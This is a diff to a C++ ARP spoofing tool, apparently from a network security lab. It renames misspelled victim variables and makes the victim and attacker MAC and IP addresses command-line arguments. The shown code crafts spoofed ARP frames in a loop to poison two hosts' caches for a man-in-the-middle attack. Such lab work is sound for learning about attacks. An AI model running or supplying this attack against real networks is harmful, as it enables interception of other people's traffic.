@@ -9,14 +9,22 @@
 #include <linux/if_packet.h> // for sockaddr_ll
 #include <sys/ioctl.h> // for ioctl
 #include <net/if.h> // for freq
+#include <netinet/ether.h> // ether_aton
 using namespace std;
-unsigned char vicitim1MAC[6];
-unsigned char vicitim2MAC[6];
+unsigned char victim1MAC[6];
+unsigned char victim2MAC[6];
 unsigned char attackerMAC[6];
 unsigned char victim1IP[4];
 unsigned char victim2IP[4];
 unsigned char attackerIP[4];
 int rawSocket;
+
+string SRC_MAC; //"02:42:0a:09:00:05"
+string DST_MAC; // "02:42:0a:09:00:06"
+string ATT_MAC; // "02:42:0a:09:00:69"
+string SRC_IP; // "10.9.0.5"
+string DST_IP; // "10.9.0.6"
+string ATT_IP; // "10.9.0.105"
 
 typedef struct EthernetHeader
 {
@@ -111,31 +119,31 @@ void craftARPFrame(unsigned char* buf, unsigned char* victimMAC, unsigned char* 
 
 }
 
-int main()
+int main(int argc, char* argv[])
 {
-    unsigned char temp1[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x05};
-    memcpy(vicitim1MAC, temp1 , 6);
-    unsigned char temp2[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x06};
-    memcpy(vicitim2MAC, temp2 , 6);
-    unsigned char temp3[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x69};
-    memcpy(attackerMAC, temp3 , 6);
-    unsigned char temp4[] = {0x0a, 0x09, 0x00, 0x05}; // 10.9.0.5
-    memcpy(victim1IP, temp4 , 4);
-    unsigned char temp5[] = {0x0a, 0x09, 0x00, 0x06}; // 10.9.0.6
-    memcpy(victim2IP, temp5 , 4);
-    unsigned char temp6[] = {0x0a, 0x09, 0x00, 0x69}; // 10.9.0.105
-    memcpy(attackerIP, temp6 , 4);
-    // victim2IP[]= {0x0a, 0x09, 0x00, 0x06}; // 10.9.0.6
-    // attackerIP[]= {0x0a, 0x09, 0x00, 0x69}; // 10.9.0.105
-    // Destination MAC: 02 42 0a 09 00 06 
-    // Source MAC: 02 42 0a 09 00 69 
-    // Protocol Type: 08 00 
-    // Destination IP: a090006
-    // Source IP: a090005
-    // Destination Port: 9090
-    // Source Port: 55000
-    // Payload size: 3
-    // Application Layer Data: 68 69 0a 
+    if(argc!=7)
+    {
+        cout<<"wrong input format!"<<endl;
+        exit(-1);
+    }
+    SRC_MAC = string(argv[1]);
+    DST_MAC = string(argv[2]);
+    ATT_MAC = string(argv[3]);
+    SRC_IP = string(argv[4]);
+    DST_IP = string(argv[5]);
+    ATT_IP = string(argv[6]);
+
+    memcpy(victim1MAC,ether_aton(SRC_MAC.c_str()),6);
+    memcpy(victim2MAC,ether_aton(DST_MAC.c_str()),6);
+    memcpy(attackerMAC,ether_aton(ATT_MAC.c_str()),6);
+    in_addr_t t1=(inet_addr(SRC_IP.c_str())); // 10.9.0.5
+    in_addr_t t2=(inet_addr(DST_IP.c_str())); // 10.9.0.6
+    in_addr_t t3=(inet_addr(ATT_IP.c_str())); // 10.9.0.105
+    memcpy(victim1IP,&t1 , 4);
+    memcpy(victim2IP,&t2 , 4);
+    memcpy(attackerIP,&t3 , 4);
+    
+   
 
 
     size_t pktBufSize = 10*1024;
@@ -161,11 +169,11 @@ int main()
         // cout<<"hello"<<endl<<flush;
         if(sendVictim1)
         {
-            craftARPFrame(rawARP,vicitim1MAC,victim1IP,attackerMAC,victim2IP);
+            craftARPFrame(rawARP,victim1MAC,victim1IP,attackerMAC,victim2IP);
         }
         else
         {
-            craftARPFrame(rawARP,vicitim2MAC,victim2IP,attackerMAC,victim1IP);
+            craftARPFrame(rawARP,victim2MAC,victim2IP,attackerMAC,victim1IP);
         }
         // cout<<"hey"<<endl<<flush;
         cout<<"ARP NO. "<<count<<endl<<flush;
